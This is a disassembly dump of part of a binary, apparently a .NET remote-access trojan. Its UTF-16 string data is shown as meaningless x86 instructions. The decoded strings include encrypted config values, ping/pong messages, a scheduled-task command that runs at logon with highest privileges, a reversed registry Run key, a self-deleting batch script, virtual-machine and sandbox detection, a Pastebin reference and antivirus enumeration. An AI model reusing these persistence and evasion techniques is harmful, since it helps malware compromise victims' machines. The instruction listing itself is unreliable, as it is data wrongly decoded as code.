  40b6c5:	00 39                	add    %bh,(%ecx)
  40b6c7:	00 67 00             	add    %ah,0x0(%edi)
  40b6ca:	44                   	inc    %esp
  40b6cb:	00 6e 00             	add    %ch,0x0(%esi)
  40b6ce:	32 00                	xor    (%eax),%al
  40b6d0:	46                   	inc    %esi
  40b6d1:	00 41 00             	add    %al,0x0(%ecx)
  40b6d4:	70 00                	jo     0x40b6d6
  40b6d6:	32 00                	xor    (%eax),%al
  40b6d8:	68 00 5a 00 67       	push   $0x67005a00
  40b6dd:	00 54 00 44          	add    %dl,0x44(%eax,%eax,1)
  40b6e1:	00 71 00             	add    %dh,0x0(%ecx)
  40b6e4:	45                   	inc    %ebp
  40b6e5:	00 4a 00             	add    %cl,0x0(%edx)
  40b6e8:	37                   	aaa
  40b6e9:	00 70 00             	add    %dh,0x0(%eax)
  40b6ec:	38 00                	cmp    %al,(%eax)
  40b6ee:	50                   	push   %eax
  40b6ef:	00 77 00             	add    %dh,0x0(%edi)
  40b6f2:	56                   	push   %esi
  40b6f3:	00 67 00             	add    %ah,0x0(%edi)
  40b6f6:	51                   	push   %ecx
  40b6f7:	00 52 00             	add    %dl,0x0(%edx)
  40b6fa:	37                   	aaa
  40b6fb:	00 74 00 75          	add    %dh,0x75(%eax,%eax,1)
  40b6ff:	00 70 00             	add    %dh,0x0(%eax)
  40b702:	59                   	pop    %ecx
  40b703:	00 41 00             	add    %al,0x0(%ecx)
  40b706:	32 00                	xor    (%eax),%al
  40b708:	78 00                	js     0x40b70a
  40b70a:	2f                   	das
  40b70b:	00 33                	add    %dh,(%ebx)
  40b70d:	00 53 00             	add    %dl,0x0(%ebx)
  40b710:	75 00                	jne    0x40b712
  40b712:	79 00                	jns    0x40b714
  40b714:	34 00                	xor    $0x0,%al
  40b716:	34 00                	xor    $0x0,%al
  40b718:	56                   	push   %esi
  40b719:	00 42 00             	add    %al,0x0(%edx)
  40b71c:	47                   	inc    %edi
  40b71d:	00 65 00             	add    %ah,0x0(%ebp)
  40b720:	73 00                	jae    0x40b722
  40b722:	48                   	dec    %eax
  40b723:	00 53 00             	add    %dl,0x0(%ebx)
  40b726:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40b72a:	3d 00 3d 00 00       	cmp    $0x3d00,%eax
  40b72f:	03 33                	add    (%ebx),%esi
  40b731:	00 00                	add    %al,(%eax)
  40b733:	80 b1 76 00 53 00 4f 	xorb   $0x4f,0x530076(%ecx)
  40b73a:	00 4d 00             	add    %cl,0x0(%ebp)
  40b73d:	32 00                	xor    (%eax),%al
  40b73f:	68 00 30 00 78       	push   $0x78003000
  40b744:	00 51 00             	add    %dl,0x0(%ecx)
  40b747:	6a 00                	push   $0x0
  40b749:	45                   	inc    %ebp
  40b74a:	00 72 00             	add    %dh,0x0(%edx)
  40b74d:	2b 00                	sub    (%eax),%eax
  40b74f:	6a 00                	push   $0x0
  40b751:	72 00                	jb     0x40b753
  40b753:	72 00                	jb     0x40b755
  40b755:	68 00 37 00 79       	push   $0x79003700
  40b75a:	00 6e 00             	add    %ch,0x0(%esi)
  40b75d:	62 00                	bound  %eax,(%eax)
  40b75f:	75 00                	jne    0x40b761
  40b761:	31 00                	xor    %eax,(%eax)
  40b763:	36 00 57 00          	add    %dl,%ss:0x0(%edi)
  40b767:	49                   	dec    %ecx
  40b768:	00 78 00             	add    %bh,0x0(%eax)
  40b76b:	36 00 53 00          	add    %dl,%ss:0x0(%ebx)
  40b76f:	34 00                	xor    $0x0,%al
  40b771:	43                   	inc    %ebx
  40b772:	00 37                	add    %dh,(%edi)
  40b774:	00 75 00             	add    %dh,0x0(%ebp)
  40b777:	65 00 33             	add    %dh,%gs:(%ebx)
  40b77a:	00 4a 00             	add    %cl,0x0(%edx)
  40b77d:	48                   	dec    %eax
  40b77e:	00 41 00             	add    %al,0x0(%ecx)
  40b781:	78 00                	js     0x40b783
  40b783:	63 00                	arpl   %eax,(%eax)
  40b785:	6c                   	insb   (%dx),%es:(%edi)
  40b786:	00 6e 00             	add    %ch,0x0(%esi)
  40b789:	53                   	push   %ebx
  40b78a:	00 43 00             	add    %al,0x0(%ebx)
  40b78d:	63 00                	arpl   %eax,(%eax)
  40b78f:	38 00                	cmp    %al,(%eax)
  40b791:	74 00                	je     0x40b793
  40b793:	61                   	popa
  40b794:	00 56 00             	add    %dl,0x0(%esi)
  40b797:	59                   	pop    %ecx
  40b798:	00 31                	add    %dh,(%ecx)
  40b79a:	00 41 00             	add    %al,0x0(%ecx)
  40b79d:	57                   	push   %edi
  40b79e:	00 4d 00             	add    %cl,0x0(%ebp)
  40b7a1:	64 00 46 00          	add    %al,%fs:0x0(%esi)
  40b7a5:	63 00                	arpl   %eax,(%eax)
  40b7a7:	35 00 2f 00 34       	xor    $0x34002f00,%eax
  40b7ac:	00 52 00             	add    %dl,0x0(%edx)
  40b7af:	52                   	push   %edx
  40b7b0:	00 7a 00             	add    %bh,0x0(%edx)
  40b7b3:	43                   	inc    %ebx
  40b7b4:	00 78 00             	add    %bh,0x0(%eax)
  40b7b7:	6c                   	insb   (%dx),%es:(%edi)
  40b7b8:	00 38                	add    %bh,(%eax)
  40b7ba:	00 4e 00             	add    %cl,0x0(%esi)
  40b7bd:	6d                   	insl   (%dx),%es:(%edi)
  40b7be:	00 76 00             	add    %dh,0x0(%esi)
  40b7c1:	4c                   	dec    %esp
  40b7c2:	00 72 00             	add    %dh,0x0(%edx)
  40b7c5:	4e                   	dec    %esi
  40b7c6:	00 51 00             	add    %dl,0x0(%ecx)
  40b7c9:	67 00 74 00          	add    %dh,0x0(%si)
  40b7cd:	36 00 4a 00          	add    %cl,%ss:0x0(%edx)
  40b7d1:	2b 00                	sub    (%eax),%eax
  40b7d3:	33 00                	xor    (%eax),%eax
  40b7d5:	30 00                	xor    %al,(%eax)
  40b7d7:	45                   	inc    %ebp
  40b7d8:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b7db:	37                   	aaa
  40b7dc:	00 73 00             	add    %dh,0x0(%ebx)
  40b7df:	67 00 3d             	add    %bh,(%di)
  40b7e2:	00 3d 00 00 09 6e    	add    %bh,0x6e090000
  40b7e8:	00 75 00             	add    %dh,0x0(%ebp)
  40b7eb:	6c                   	insb   (%dx),%es:(%edi)
  40b7ec:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40b7f0:	01 00                	add    %eax,(%eax)
  40b7f2:	03 3a                	add    (%edx),%edi
  40b7f4:	00 00                	add    %al,(%eax)
  40b7f6:	0d 50 00 61 00       	or     $0x610050,%eax
  40b7fb:	63 00                	arpl   %eax,(%eax)
  40b7fd:	6b 00 65             	imul   $0x65,(%eax),%eax
  40b800:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b804:	09 50 00             	or     %edx,0x0(%eax)
  40b807:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b80d:	00 0f                	add    %cl,(%edi)
  40b80f:	4d                   	dec    %ebp
  40b810:	00 65 00             	add    %ah,0x0(%ebp)
  40b813:	73 00                	jae    0x40b815
  40b815:	73 00                	jae    0x40b817
  40b817:	61                   	popa
  40b818:	00 67 00             	add    %ah,0x0(%edi)
  40b81b:	65 00 00             	add    %al,%gs:(%eax)
  40b81e:	07                   	pop    %es
  40b81f:	63 00                	arpl   %eax,(%eax)
  40b821:	6d                   	insl   (%dx),%es:(%edi)
  40b822:	00 64 00 00          	add    %ah,0x0(%eax,%eax,1)
  40b826:	69 2f 00 63 00 20    	imul   $0x20006300,(%edi),%ebp
  40b82c:	00 73 00             	add    %dh,0x0(%ebx)
  40b82f:	63 00                	arpl   %eax,(%eax)
  40b831:	68 00 74 00 61       	push   $0x61007400
  40b836:	00 73 00             	add    %dh,0x0(%ebx)
  40b839:	6b 00 73             	imul   $0x73,(%eax),%eax
  40b83c:	00 20                	add    %ah,(%eax)
  40b83e:	00 2f                	add    %ch,(%edi)
  40b840:	00 63 00             	add    %ah,0x0(%ebx)
  40b843:	72 00                	jb     0x40b845
  40b845:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40b849:	74 00                	je     0x40b84b
  40b84b:	65 00 20             	add    %ah,%gs:(%eax)
  40b84e:	00 2f                	add    %ch,(%edi)
  40b850:	00 66 00             	add    %ah,0x0(%esi)
  40b853:	20 00                	and    %al,(%eax)
  40b855:	2f                   	das
  40b856:	00 73 00             	add    %dh,0x0(%ebx)
  40b859:	63 00                	arpl   %eax,(%eax)
  40b85b:	20 00                	and    %al,(%eax)
  40b85d:	6f                   	outsl  %ds:(%esi),(%dx)
  40b85e:	00 6e 00             	add    %ch,0x0(%esi)
  40b861:	6c                   	insb   (%dx),%es:(%edi)
  40b862:	00 6f 00             	add    %ch,0x0(%edi)
  40b865:	67 00 6f 00          	add    %ch,0x0(%bx)
  40b869:	6e                   	outsb  %ds:(%esi),(%dx)
  40b86a:	00 20                	add    %ah,(%eax)
  40b86c:	00 2f                	add    %ch,(%edi)
  40b86e:	00 72 00             	add    %dh,0x0(%edx)
  40b871:	6c                   	insb   (%dx),%es:(%edi)
  40b872:	00 20                	add    %ah,(%eax)
  40b874:	00 68 00             	add    %ch,0x0(%eax)
  40b877:	69 00 67 00 68 00    	imul   $0x680067,(%eax),%eax
  40b87d:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40b881:	74 00                	je     0x40b883
  40b883:	20 00                	and    %al,(%eax)
  40b885:	2f                   	das
  40b886:	00 74 00 6e          	add    %dh,0x6e(%eax,%eax,1)
  40b88a:	00 20                	add    %ah,(%eax)
  40b88c:	00 22                	add    %ah,(%edx)
  40b88e:	00 00                	add    %al,(%eax)
  40b890:	11 22                	adc    %esp,(%edx)
  40b892:	00 20                	add    %ah,(%eax)
  40b894:	00 2f                	add    %ch,(%edi)
  40b896:	00 74 00 72          	add    %dh,0x72(%eax,%eax,1)
  40b89a:	00 20                	add    %ah,(%eax)
  40b89c:	00 27                	add    %ah,(%edi)
  40b89e:	00 22                	add    %ah,(%edx)
  40b8a0:	00 01                	add    %al,(%ecx)
  40b8a2:	13 22                	adc    (%edx),%esp
  40b8a4:	00 27                	add    %ah,(%edi)
  40b8a6:	00 20                	add    %ah,(%eax)
  40b8a8:	00 26                	add    %ah,(%esi)
  40b8aa:	00 20                	add    %ah,(%eax)
  40b8ac:	00 65 00             	add    %ah,0x0(%ebp)
  40b8af:	78 00                	js     0x40b8b1
  40b8b1:	69 00 74 00 01 5d    	imul   $0x5d010074,(%eax),%eax
  40b8b7:	5c                   	pop    %esp
  40b8b8:	00 6e 00             	add    %ch,0x0(%esi)
  40b8bb:	75 00                	jne    0x40b8bd
  40b8bd:	52                   	push   %edx
  40b8be:	00 5c 00 6e          	add    %bl,0x6e(%eax,%eax,1)
  40b8c2:	00 6f 00             	add    %ch,0x0(%edi)
  40b8c5:	69 00 73 00 72 00    	imul   $0x720073,(%eax),%eax
  40b8cb:	65 00 56 00          	add    %dl,%gs:0x0(%esi)
  40b8cf:	74 00                	je     0x40b8d1
  40b8d1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b8d2:	00 65 00             	add    %ah,0x0(%ebp)
  40b8d5:	72 00                	jb     0x40b8d7
  40b8d7:	72 00                	jb     0x40b8d9
  40b8d9:	75 00                	jne    0x40b8db
  40b8db:	43                   	inc    %ebx
  40b8dc:	00 5c 00 73          	add    %bl,0x73(%eax,%eax,1)
  40b8e0:	00 77 00             	add    %dh,0x0(%edi)
  40b8e3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8e4:	00 64 00 6e          	add    %ah,0x6e(%eax,%eax,1)
  40b8e8:	00 69 00             	add    %ch,0x0(%ecx)
  40b8eb:	57                   	push   %edi
  40b8ec:	00 5c 00 74          	add    %bl,0x74(%eax,%eax,1)
  40b8f0:	00 66 00             	add    %ah,0x0(%esi)
  40b8f3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f4:	00 73 00             	add    %dh,0x0(%ebx)
  40b8f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b8f8:	00 72 00             	add    %dh,0x0(%edx)
  40b8fb:	63 00                	arpl   %eax,(%eax)
  40b8fd:	69 00 4d 00 5c 00    	imul   $0x5c004d,(%eax),%eax
  40b903:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b907:	61                   	popa
  40b908:	00 77 00             	add    %dh,0x0(%edi)
  40b90b:	74 00                	je     0x40b90d
  40b90d:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40b911:	53                   	push   %ebx
  40b912:	00 00                	add    %al,(%eax)
  40b914:	03 22                	add    (%edx),%esp
  40b916:	00 00                	add    %al,(%eax)
  40b918:	09 2e                	or     %ebp,(%esi)
  40b91a:	00 62 00             	add    %ah,0x0(%edx)
  40b91d:	61                   	popa
  40b91e:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40b922:	13 40 00             	adc    0x0(%eax),%eax
  40b925:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b929:	68 00 6f 00 20       	push   $0x20006f00
  40b92e:	00 6f 00             	add    %ch,0x0(%edi)
  40b931:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40b935:	00 1f                	add    %bl,(%edi)
  40b937:	74 00                	je     0x40b939
  40b939:	69 00 6d 00 65 00    	imul   $0x65006d,(%eax),%eax
  40b93f:	6f                   	outsl  %ds:(%esi),(%dx)
  40b940:	00 75 00             	add    %dh,0x0(%ebp)
  40b943:	74 00                	je     0x40b945
  40b945:	20 00                	and    %al,(%eax)
  40b947:	33 00                	xor    (%eax),%eax
  40b949:	20 00                	and    %al,(%eax)
  40b94b:	3e 00 20             	add    %ah,%ds:(%eax)
  40b94e:	00 4e 00             	add    %cl,0x0(%esi)
  40b951:	55                   	push   %ebp
  40b952:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40b956:	15 53 00 54 00       	adc    $0x540053,%eax
  40b95b:	41                   	inc    %ecx
  40b95c:	00 52 00             	add    %dl,0x0(%edx)
  40b95f:	54                   	push   %esp
  40b960:	00 20                	add    %ah,(%eax)
  40b962:	00 22                	add    %ah,(%edx)
  40b964:	00 22                	add    %ah,(%edx)
  40b966:	00 20                	add    %ah,(%eax)
  40b968:	00 22                	add    %ah,(%edx)
  40b96a:	00 00                	add    %al,(%eax)
  40b96c:	07                   	pop    %es
  40b96d:	43                   	inc    %ebx
  40b96e:	00 44 00 20          	add    %al,0x20(%eax,%eax,1)
  40b972:	00 00                	add    %al,(%eax)
  40b974:	0b 44 00 45          	or     0x45(%eax,%eax,1),%eax
  40b978:	00 4c 00 20          	add    %cl,0x20(%eax,%eax,1)
  40b97c:	00 22                	add    %ah,(%edx)
  40b97e:	00 00                	add    %al,(%eax)
  40b980:	0f 22 00             	mov    %eax,%cr0
  40b983:	20 00                	and    %al,(%eax)
  40b985:	2f                   	das
  40b986:	00 66 00             	add    %ah,0x0(%esi)
  40b989:	20 00                	and    %al,(%eax)
  40b98b:	2f                   	das
  40b98c:	00 71 00             	add    %dh,0x0(%ecx)
  40b98f:	00 05 78 00 70 00    	add    %al,0x700078
  40b995:	00 45 53             	add    %al,0x53(%ebp)
  40b998:	00 65 00             	add    %ah,0x0(%ebp)
  40b99b:	6c                   	insb   (%dx),%es:(%edi)
  40b99c:	00 65 00             	add    %ah,0x0(%ebp)
  40b99f:	63 00                	arpl   %eax,(%eax)
  40b9a1:	74 00                	je     0x40b9a3
  40b9a3:	20 00                	and    %al,(%eax)
  40b9a5:	2a 00                	sub    (%eax),%al
  40b9a7:	20 00                	and    %al,(%eax)
  40b9a9:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b9ad:	6f                   	outsl  %ds:(%esi),(%dx)
  40b9ae:	00 6d 00             	add    %ch,0x0(%ebp)
  40b9b1:	20 00                	and    %al,(%eax)
  40b9b3:	57                   	push   %edi
  40b9b4:	00 69 00             	add    %ch,0x0(%ecx)
  40b9b7:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9b8:	00 33                	add    %dh,(%ebx)
  40b9ba:	00 32                	add    %dh,(%edx)
  40b9bc:	00 5f 00             	add    %bl,0x0(%edi)
  40b9bf:	43                   	inc    %ebx
  40b9c0:	00 6f 00             	add    %ch,0x0(%edi)
  40b9c3:	6d                   	insl   (%dx),%es:(%edi)
  40b9c4:	00 70 00             	add    %dh,0x0(%eax)
  40b9c7:	75 00                	jne    0x40b9c9
  40b9c9:	74 00                	je     0x40b9cb
  40b9cb:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9cf:	53                   	push   %ebx
  40b9d0:	00 79 00             	add    %bh,0x0(%ecx)
  40b9d3:	73 00                	jae    0x40b9d5
  40b9d5:	74 00                	je     0x40b9d7
  40b9d7:	65 00 6d 00          	add    %ch,%gs:0x0(%ebp)
  40b9db:	00 19                	add    %bl,(%ecx)
  40b9dd:	4d                   	dec    %ebp
  40b9de:	00 61 00             	add    %ah,0x0(%ecx)
  40b9e1:	6e                   	outsb  %ds:(%esi),(%dx)
  40b9e2:	00 75 00             	add    %dh,0x0(%ebp)
  40b9e5:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b9e9:	63 00                	arpl   %eax,(%eax)
  40b9eb:	74 00                	je     0x40b9ed
  40b9ed:	75 00                	jne    0x40b9ef
  40b9ef:	72 00                	jb     0x40b9f1
  40b9f1:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b9f5:	00 2b                	add    %ch,(%ebx)
  40b9f7:	6d                   	insl   (%dx),%es:(%edi)
  40b9f8:	00 69 00             	add    %ch,0x0(%ecx)
  40b9fb:	63 00                	arpl   %eax,(%eax)
  40b9fd:	72 00                	jb     0x40b9ff
  40b9ff:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba00:	00 73 00             	add    %dh,0x0(%ebx)
  40ba03:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba04:	00 66 00             	add    %ah,0x0(%esi)
  40ba07:	74 00                	je     0x40ba09
  40ba09:	20 00                	and    %al,(%eax)
  40ba0b:	63 00                	arpl   %eax,(%eax)
  40ba0d:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba0e:	00 72 00             	add    %dh,0x0(%edx)
  40ba11:	70 00                	jo     0x40ba13
  40ba13:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba14:	00 72 00             	add    %dh,0x0(%edx)
  40ba17:	61                   	popa
  40ba18:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  40ba1c:	00 6f 00             	add    %ch,0x0(%edi)
  40ba1f:	6e                   	outsb  %ds:(%esi),(%dx)
  40ba20:	00 00                	add    %al,(%eax)
  40ba22:	0b 4d 00             	or     0x0(%ebp),%ecx
  40ba25:	6f                   	outsl  %ds:(%esi),(%dx)
  40ba26:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40ba2a:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ba2e:	0f 56 00             	orps   (%eax),%xmm0
  40ba31:	49                   	dec    %ecx
  40ba32:	00 52 00             	add    %dl,0x0(%edx)
  40ba35:	54                   	push   %esp
  40ba36:	00 55 00             	add    %dl,0x0(%ebp)
  40ba39:	41                   	inc    %ecx
  40ba3a:	00 4c 00 00          	add    %cl,0x0(%eax,%eax,1)
  40ba3e:	0d 76 00 6d 00       	or     $0x6d0076,%eax
  40ba43:	77 00                	ja     0x40ba45
  40ba45:	61                   	popa
  40ba46:	00 72 00             	add    %dh,0x0(%edx)
  40ba49:	65 00 00             	add    %al,%gs:(%eax)
  40ba4c:	15 56 00 69 00       	adc    $0x690056,%eax
  40ba51:	72 00                	jb     0x40ba53
  40ba53:	74 00                	je     0x40ba55
  40ba55:	75 00                	jne    0x40ba57
  40ba57:	61                   	popa
  40ba58:	00 6c 00 42          	add    %ch,0x42(%eax,%eax,1)
  40ba5c:	00 6f 00             	add    %ch,0x0(%edi)
  40ba5f:	78 00                	js     0x40ba61
  40ba61:	00 17                	add    %dl,(%edi)
  40ba63:	53                   	push   %ebx
  40ba64:	00 62 00             	add    %ah,0x0(%edx)
  40ba67:	69 00 65 00 44 00    	imul   $0x440065,(%eax),%eax
  40ba6d:	6c                   	insb   (%dx),%es:(%edi)
  40ba6e:	00 6c 00 2e          	add    %ch,0x2e(%eax,%eax,1)
  40ba72:	00 64 00 6c          	add    %ah,0x6c(%eax,%eax,1)
  40ba76:	00 6c 00 00          	add    %ch,0x0(%eax,%eax,1)
  40ba7a:	11 45 00             	adc    %eax,0x0(%ebp)
  40ba7d:	72 00                	jb     0x40ba7f
  40ba7f:	72 00                	jb     0x40ba81
  40ba81:	20 00                	and    %al,(%eax)
  40ba83:	48                   	dec    %eax
  40ba84:	00 57 00             	add    %dl,0x0(%edi)
  40ba87:	49                   	dec    %ecx
  40ba88:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40ba8c:	05 78 00 32 00       	add    $0x320078,%eax
  40ba91:	00 15 43 00 6c 00    	add    %dl,0x6c0043
  40ba97:	69 00 65 00 6e 00    	imul   $0x6e0065,(%eax),%eax
  40ba9d:	74 00                	je     0x40ba9f
  40ba9f:	49                   	dec    %ecx
  40baa0:	00 6e 00             	add    %ch,0x0(%esi)
  40baa3:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40baa7:	00 09                	add    %cl,(%ecx)
  40baa9:	48                   	dec    %eax
  40baaa:	00 57 00             	add    %dl,0x0(%edi)
  40baad:	49                   	dec    %ecx
  40baae:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40bab2:	09 55 00             	or     %edx,0x0(%ebp)
  40bab5:	73 00                	jae    0x40bab7
  40bab7:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40babb:	00 05 4f 00 53 00    	add    %al,0x53004f
  40bac1:	00 13                	add    %dl,(%ebx)
  40bac3:	4d                   	dec    %ebp
  40bac4:	00 69 00             	add    %ch,0x0(%ecx)
  40bac7:	63 00                	arpl   %eax,(%eax)
  40bac9:	72 00                	jb     0x40bacb
  40bacb:	6f                   	outsl  %ds:(%esi),(%dx)
  40bacc:	00 73 00             	add    %dh,0x0(%ebx)
  40bacf:	6f                   	outsl  %ds:(%esi),(%dx)
  40bad0:	00 66 00             	add    %ah,0x0(%esi)
  40bad3:	74 00                	je     0x40bad5
  40bad5:	00 03                	add    %al,(%ebx)
  40bad7:	20 00                	and    %al,(%eax)
  40bad9:	00 09                	add    %cl,(%ecx)
  40badb:	54                   	push   %esp
  40badc:	00 72 00             	add    %dh,0x0(%edx)
  40badf:	75 00                	jne    0x40bae1
  40bae1:	65 00 00             	add    %al,%gs:(%eax)
  40bae4:	0b 36                	or     (%esi),%esi
  40bae6:	00 34 00             	add    %dh,(%eax,%eax,1)
  40bae9:	62 00                	bound  %eax,(%eax)
  40baeb:	69 00 74 00 00 0b    	imul   $0xb000074,(%eax),%eax
  40baf1:	46                   	inc    %esi
  40baf2:	00 61 00             	add    %ah,0x0(%ecx)
  40baf5:	6c                   	insb   (%dx),%es:(%edi)
  40baf6:	00 73 00             	add    %dh,0x0(%ebx)
  40baf9:	65 00 00             	add    %al,%gs:(%eax)
  40bafc:	0b 33                	or     (%ebx),%esi
  40bafe:	00 32                	add    %dh,(%edx)
  40bb00:	00 62 00             	add    %ah,0x0(%edx)
  40bb03:	69 00 74 00 00 09    	imul   $0x9000074,(%eax),%eax
  40bb09:	50                   	push   %eax
  40bb0a:	00 61 00             	add    %ah,0x0(%ecx)
  40bb0d:	74 00                	je     0x40bb0f
  40bb0f:	68 00 00 0f 56       	push   $0x560f0000
  40bb14:	00 65 00             	add    %ah,0x0(%ebp)
  40bb17:	72 00                	jb     0x40bb19
  40bb19:	73 00                	jae    0x40bb1b
  40bb1b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40bb21:	00 0b                	add    %cl,(%ebx)
  40bb23:	41                   	inc    %ecx
  40bb24:	00 64 00 6d          	add    %ah,0x6d(%eax,%eax,1)
  40bb28:	00 69 00             	add    %ch,0x0(%ecx)
  40bb2b:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb2c:	00 00                	add    %al,(%eax)
  40bb2e:	09 74 00 72          	or     %esi,0x72(%eax,%eax,1)
  40bb32:	00 75 00             	add    %dh,0x0(%ebp)
  40bb35:	65 00 00             	add    %al,%gs:(%eax)
  40bb38:	0b 66 00             	or     0x0(%esi),%esp
  40bb3b:	61                   	popa
  40bb3c:	00 6c 00 73          	add    %ch,0x73(%eax,%eax,1)
  40bb40:	00 65 00             	add    %ah,0x0(%ebp)
  40bb43:	00 17                	add    %dl,(%edi)
  40bb45:	50                   	push   %eax
  40bb46:	00 65 00             	add    %ah,0x0(%ebp)
  40bb49:	72 00                	jb     0x40bb4b
  40bb4b:	66 00 6f 00          	data16 add %ch,0x0(%edi)
  40bb4f:	72 00                	jb     0x40bb51
  40bb51:	6d                   	insl   (%dx),%es:(%edi)
  40bb52:	00 61 00             	add    %ah,0x0(%ecx)
  40bb55:	6e                   	outsb  %ds:(%esi),(%dx)
  40bb56:	00 63 00             	add    %ah,0x0(%ebx)
  40bb59:	65 00 00             	add    %al,%gs:(%eax)
  40bb5c:	11 50 00             	adc    %edx,0x0(%eax)
  40bb5f:	61                   	popa
  40bb60:	00 73 00             	add    %dh,0x0(%ebx)
  40bb63:	74 00                	je     0x40bb65
  40bb65:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40bb69:	69 00 6e 00 00 13    	imul   $0x1300006e,(%eax),%eax
  40bb6f:	41                   	inc    %ecx
  40bb70:	00 6e 00             	add    %ch,0x0(%esi)
  40bb73:	74 00                	je     0x40bb75
  40bb75:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bb7b:	72 00                	jb     0x40bb7d
  40bb7d:	75 00                	jne    0x40bb7f
  40bb7f:	73 00                	jae    0x40bb81
  40bb81:	00 13                	add    %dl,(%ebx)
  40bb83:	49                   	dec    %ecx
  40bb84:	00 6e 00             	add    %ch,0x0(%esi)
  40bb87:	73 00                	jae    0x40bb89
  40bb89:	74 00                	je     0x40bb8b
  40bb8b:	61                   	popa
  40bb8c:	00 6c 00 6c          	add    %ch,0x6c(%eax,%eax,1)
  40bb90:	00 65 00             	add    %ah,0x0(%ebp)
  40bb93:	64 00 00             	add    %al,%fs:(%eax)
  40bb96:	09 50 00             	or     %edx,0x0(%eax)
  40bb99:	6f                   	outsl  %ds:(%esi),(%dx)
  40bb9a:	00 6e 00             	add    %ch,0x0(%esi)
  40bb9d:	67 00 00             	add    %al,(%bx,%si)
  40bba0:	0b 47 00             	or     0x0(%edi),%eax
  40bba3:	72 00                	jb     0x40bba5
  40bba5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bba6:	00 75 00             	add    %dh,0x0(%ebp)
  40bba9:	70 00                	jo     0x40bbab
  40bbab:	00 05 5c 00 5c 00    	add    %al,0x5c005c
  40bbb1:	00 2b                	add    %ch,(%ebx)
  40bbb3:	5c                   	pop    %esp
  40bbb4:	00 72 00             	add    %dh,0x0(%edx)
  40bbb7:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbb8:	00 6f 00             	add    %ch,0x0(%edi)
  40bbbb:	74 00                	je     0x40bbbd
  40bbbd:	5c                   	pop    %esp
  40bbbe:	00 53 00             	add    %dl,0x0(%ebx)
  40bbc1:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40bbc5:	75 00                	jne    0x40bbc7
  40bbc7:	72 00                	jb     0x40bbc9
  40bbc9:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40bbcf:	43                   	inc    %ebx
  40bbd0:	00 65 00             	add    %ah,0x0(%ebp)
  40bbd3:	6e                   	outsb  %ds:(%esi),(%dx)
  40bbd4:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40bbd8:	00 72 00             	add    %dh,0x0(%edx)
  40bbdb:	32 00                	xor    (%eax),%al
  40bbdd:	00 3d 53 00 65 00    	add    %bh,0x650053
  40bbe3:	6c                   	insb   (%dx),%es:(%edi)
  40bbe4:	00 65 00             	add    %ah,0x0(%ebp)
  40bbe7:	63 00                	arpl   %eax,(%eax)
  40bbe9:	74 00                	je     0x40bbeb
  40bbeb:	20 00                	and    %al,(%eax)
  40bbed:	2a 00                	sub    (%eax),%al
  40bbef:	20 00                	and    %al,(%eax)
  40bbf1:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40bbf5:	6f                   	outsl  %ds:(%esi),(%dx)
  40bbf6:	00 6d 00             	add    %ch,0x0(%ebp)
  40bbf9:	20 00                	and    %al,(%eax)
  40bbfb:	41                   	inc    %ecx
  40bbfc:	00 6e 00             	add    %ch,0x0(%esi)
  40bbff:	74 00                	je     0x40bc01
  40bc01:	69 00 76 00 69 00    	imul   $0x690076,(%eax),%eax
  40bc07:	72 00                	jb     0x40bc09
  40bc09:	75 00                	jne    0x40bc0b
  40bc0b:	73 00                	jae    0x40bc0d
  40bc0d:	50                   	push   %eax
  40bc0e:	00 72 00             	add    %dh,0x0(%edx)
  40bc11:	6f                   	outsl  %ds:(%esi),(%dx)
  40bc12:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40bc16:	00 63 00             	add    %ah,0x0(%ebx)
  40bc19:	74 00                	je     0x40bc1b
  40bc1b:	00 17                	add    %dl,(%edi)
  40bc1d:	64 00 69 00          	add    %ch,%fs:0x0(%ecx)
  40bc21:	73 00                	jae    0x40bc23
  40bc23:	70 00                	jo     0x40bc25
  40bc25:	6c                   	insb   (%dx),%es:(%edi)
  40bc26:	00 61 00             	add    %ah,0x0(%ecx)
  40bc29:	79 00                	jns    0x40bc2b
  40bc2b:	4e                   	dec    %esi
  40bc2c:	00 61 00             	add    %ah,0x0(%ecx)
  40bc2f:	6d                   	insl   (%dx),%es:(%edi)
